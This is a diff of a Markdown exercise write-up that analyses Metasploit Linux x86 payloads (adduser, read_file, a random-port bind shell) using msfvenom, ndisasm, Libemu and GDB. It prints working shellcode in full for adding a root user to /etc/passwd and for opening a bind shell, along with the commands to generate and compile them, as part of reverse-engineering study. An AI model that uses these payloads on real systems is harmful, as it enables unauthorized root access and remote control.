@@ -1,126 +1,3 @@
-# Exercise 5
-
-## 5.1 Payload *linux/x86/adduser*
-
-### Check options
-```
-msfvenom -p linux/x86/adduser --list-options
-```
-
-![Screenshot](images/adduser/1.png)
-
-![Screenshot](images/adduser/2.png)
-
-
-There are 3 basic options:
-
-- PASS: The password for this user (Required). Default: metasploit
-- SHELL: The shell for this user. Default: /bin/sh
-- USER: The username to create (Required). Default: metasploit
-
-For this study we will use the three basic options:
-
-```
-msfvenom -p linux/x86/adduser USER=ricardo PASS=sectube SHELL=/bin/bash --platform=Linux -a x86 -f c
-```
-
-### One-liner for getting shellcode 
-
-The fastest way to get the shellcode in my case was using two pipes, one with 'sed' and a second one with 'paste' command:
-
-```
-msfvenom -p linux/x86/adduser --platform=Linux -a x86 -f c USER=ricardo PASS=sectube SHELL=/bin/bash | grep '"' | sed -e 's/\"//g' | paste -sd "" - | tr ";" " "
-```
-
-Using it, we get the shellcode we will use for the study of the payload:
-
-![Screenshot](images/adduser/3.png)
-
-
-### Libemu
-
-Libemu does not show any output in this case:
-
-![Screenshot](images/adduser/4.png)
-
-When the PNG picture is generated it is empty.
-
-
-### Ndisasm
-
-With ndisasm it is possible to get the .nasm code using:
-
-```
-echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x27\x00\x00\x00\x72\x69\x63\x61\x72\x64\x6f\x3a\x41\x7a\x76\x44\x72\x2e\x72\x57\x33\x54\x34\x69\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
-```
-
-![Screenshot](images/adduser/5.png)
-
-Using awk it is possible to get only the part we want and create a .nasm file:
-
-```
-echo -e "section .text\nglobal _start \n_start:" > 1.nasm
-
-echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x27\x00\x00\x00\x72\x69\x63\x61\x72\x64\x6f\x3a\x41\x7a\x76\x44\x72\x2e\x72\x57\x33\x54\x34\x69\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u - | awk '{$2=$2};1' - | cut -d " " -f 3-10 >> 1.nasm
-```
-
-![Screenshot](images/adduser/6.png)
-
-It seems ok:
-
-![Screenshot](images/adduser/7.png)
-
-With a little bit of indentation, the nasm file is created and ready to be studied. 
-
-
-### Studying the syscalls
-
-Given we have the nasm code, the first thing to do will be studying the different syscalls. We can do this checking the lines containing "int 0x80" in the code. 
-
-In this case we have four syscalls:
-
-![Screenshot](images/adduser/8.png)
-
-The most important in this case is checking the value of the register EAX to check what type of syscall is being used. The two first syscalls seem to use the values 0x46 and 0x5 (we will check later using GDB):
-
-![Screenshot](images/adduser/9.png)
-
-
-The two last syscalls seem to use the values 0x4 and 0x1:
-
-![Screenshot](images/adduser/10.png)
-
-
-After checking the /usr/include/i386-linux-gnu/asm/unistd_32.h file, the syscalls seem to be:
-
-- Syscall 1 (Value 0x46 or 70 in decimal): setreuid() - *It sets real and effective user IDs of the calling process*.
-
-- Syscall 2 (Value 0x5 or 5 in decimal): open() - *It opens the file specified by pathname*.
-
-- Syscall 3 (Value 0x4 or 4 in decimal): write()
-
-- Syscall 4 (Value 0x1 or 1 in decimal): exit() - *It causes normal process termination and the value of status & 0377 is returned to the parent*
-
-
-### Study with GDB
-
-
-
-## 5.2 Payload *linux/x86/read_file*
-
-### Check options
-```
-msfvenom -p linux/x86/read_file --list-options
-```
-
-
-
-
-
-
-
-
-
 
 ## 5.3 Payload *linux/x86/shell_bind_tcp_random_port*
 
@@ -129,9 +6,9 @@ msfvenom -p linux/x86/read_file --list-options
 msfvenom -p linux/x86/shell_bind_tcp_random_port --list-options
 ```
 
-![Screenshot](images/randbind/1.png)
+![Screenshot](../images/randbind/1.png)
 
-![Screenshot](images/randbind/2.png)
+![Screenshot](../images/randbind/2.png)
 
 There is not any basic option in this case.
 
@@ -151,7 +28,37 @@ msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c | 
 
 Using it, we get the shellcode we will use for the study of the payload:
 
-![Screenshot](images/adduser/3.png)
+![Screenshot](../images/randbind/3.png)
+
+
+
+### Ndisasm
+
+Before studying the syscalls, the .nasm code is extracted using Ndisasm:
+
+```
+msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c | ndisasm -u -
+```
+
+
+Or a little quicker:
+
+```
+echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" | ndisasm -u -
+```
+
+![Screenshot](../images/randbind/6.png)
+
+Using awk it is possible to get only the part we want and create a .nasm file:
+
+```
+echo -e "section .text\nglobal _start \n_start:" > 3.nasm
+
+echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" | ndisasm -u - | awk '{$2=$2};1' - | cut -d " " -f 3-10 >> 3.nasm
+```
+
+![Screenshot](../images/randbind/7.png)
+
 
 
 ### Libemu
@@ -162,7 +69,7 @@ In this case Libemu works correctly:
 echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" |  ./sctest -vvv -Ss 10000 -G randbind.dot
 ```
 
-![Screenshot](images/adduser/4.png)
+![Screenshot](../images/randbind/4.png)
 
 We get the next output:
 
@@ -254,18 +161,6 @@ int execve (
          none;
 ) =  0;
 ```
-The list of syscalls in order is:
-
-- Socket
-
-- Listen
-
-- Accept
-
-- Dup2
-
-- Execve
-
 
 Finally the PNG picture is created using:
 
@@ -273,4 +168,208 @@ Finally the PNG picture is created using:
 dot randbind.dot -T png -o randbind.png
 ```
 
-![Screenshot](images/adduser/5.png)
+![Screenshot](../images/randbind/5.png)
+
+
+### Studying the syscalls
+
+Given we have the nasm code, the first thing to do will be studying the different syscalls. We can do this checking the lines containing "int 0x80" in the code. 
+
+In this case we have five syscalls:
+
+![Screenshot](../images/randbind/8.png)
+
+After checking the */usr/include/i386-linux-gnu/asm/unistd_32.h* file, the syscalls seem different to the ones we got using Libemu:
+
+Libeu states the list of syscalls is:
+
+- Syscall 1: socket() - *It creates  an  endpoint  for communication and returns a file descriptor that refers to that endpoint.*
+
+- Syscall 2: listen() - *It marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection  requests using accept(2).*
+
+- Syscall 3: accept() - *It extracts the first connection request on the queue of pending connections for the listening socket, sockfd, creates a new connected socket, and returns a new file descriptor referring to that socket.*
+
+- Syscall 4: dup2() - *It system call creates a copy of the file descriptor oldfd, using the lowest-numbered unused file descriptor for the new descriptor.*
+
+- Syscall 5: execve() - *It executes  the  program pointed to by filename*.
+
+
+The nasm file states the list of syscalls is:
+
+- Syscall 1 (Value 0x66 or 102 in decimal): socketcall() - *It is a common kernel entry point for the socket system calls*
+
+- Syscall 2 (Value 0x66 or 102 in decimal): socketcall() - *It is a common kernel entry point for the socket system calls*
+
+- Syscall 3 (Value 0x66 or 102 in decimal): socketcall() - *It is a common kernel entry point for the socket system calls*
+
+- Syscall 4 (Value 03f or 63 in decimal): dup2() - *It system call creates a copy of the file descriptor oldfd, using the lowest-numbered unused file descriptor for the new descriptor.*
+
+- Syscall 5 (Value 0xb or 11 in decimal): execve() - *It executes  the  program pointed to by filename*.
+
+So Libemu interprets which is the specific socket call in the first three syscalls.
+
+![Screenshot](../images/randbind/9.png)
+
+
+
+### Generating the executable
+
+In this third case, it is possible to compile the NASM code and generate a working executable, but it crashes after connecting to the port:
+
+![Screenshot](../images/randbind/22.png)
+
+So again, itt is necessary to use the *shellcode.c* file:
+
+![Screenshot](../images/randbind/23.png)
+
+It is compiled:
+
+```
+gcc -fno-stack-protector -z execstack shellcode.c -o 3
+```
+
+An executable named "3" gets generated. It is possible to execute it and check that it works correctly:
+
+![Screenshot](../images/randbind/24.png)
+
+
+Also it is possible to look for interesting strings like this one:
+
+![Screenshot](../images/randbind/11.png)
+
+
+### Study with GDB
+
+We attach the executable in quiet mode, set the disassembly flavor, define the "hook-stop" function, run the program and stop in the main function:
+
+![Screenshot](../images/randbind/12.png)
+
+Now, we must jump to the shellcode, so we set a breakpoint in the last 'call eax' instruction visible in the previous screenshot (the previous call instructions show the length of the shellcode).
+
+We continue for one instruction using 'stepi' and the 'disassemble' command shows we have reached the shellcode. All the shellcode with the five syscalls can be read:
+
+![Screenshot](../images/randbind/12_5.png)
+
+We set breakpoint in every one of them:
+
+![Screenshot](../images/randbind/14.png)
+
+
+
+We reach the first syscall:
+
+![Screenshot](../images/randbind/15.png)
+
+We read the man page of socketcall:
+
+![Screenshot](../images/randbind/16.png)
+
+And then the values are:
+
+- EAX = 102 => Syscall is socketcall()
+
+- EBX = 1 => 
+
+- ECX = -1073745200 => 
+
+- EDX = 0 => 
+
+
+We reach the second syscall:
+
+![Screenshot](../images/randbind/17.png)
+
+We read the man page of socketcall:
+
+![Screenshot](../images/randbind/16.png)
+
+And then the values are:
+
+- EAX = 102 => Syscall is socketcall()
+
+- EBX = 4 => 
+
+- ECX = -1073745208 => 
+
+- EDX = 0 => 
+
+
+We reach the third syscall:
+
+![Screenshot](../images/randbind/18.png)
+
+We read the man page of socketcall:
+
+![Screenshot](../images/randbind/16.png)
+
+And then the values are:
+
+- EAX = 102 => Syscall is socketcall()
+
+- EBX = 5 => 
+
+- ECX = -1073745208 => 
+
+- EDX = 0 => 
+
+
+Now, it is necessary to check which is the port opened and connect to it:
+
+![Screenshot](../images/randbind/19.png)
+
+
+Then, we reach the fourth syscall:
+
+![Screenshot](../images/randbind/20.png)
+
+We read the man page of dup2:
+
+![Screenshot](../images/randbind/25.png)
+
+And then the values are:
+
+- EAX = 63 => Syscall is dup2()
+
+- EBX = 4 => Old file descriptor
+
+- ECX = 3 => New file descriptor
+
+
+Later the breakpoint is reached again only changing the ECX value to 2, 1 and then 0.
+
+
+We reach the fifth syscall:
+
+![Screenshot](../images/randbind/27.png)
+
+We read the man page of execve:
+
+![Screenshot](../images/randbind/26.png)
+
+And then the values are:
+
+- EAX = 11 => Syscall is execve()
+
+- EBX = -1073745212 => 
+
+- ECX = 0 => 
+
+- EDX = 0 => 
+
+
+
+
+### Update/correct NASM file
+
+Now we can update the nasm code adding the necessary jump:
+
+![Screenshot](../images/read_file/28.png)
+
+Finally we can compile the nasm file and check it works correctly:
+
+![Screenshot](../images/read_file/29.png)
+
+![Screenshot](../images/read_file/30.png)
+
+
+
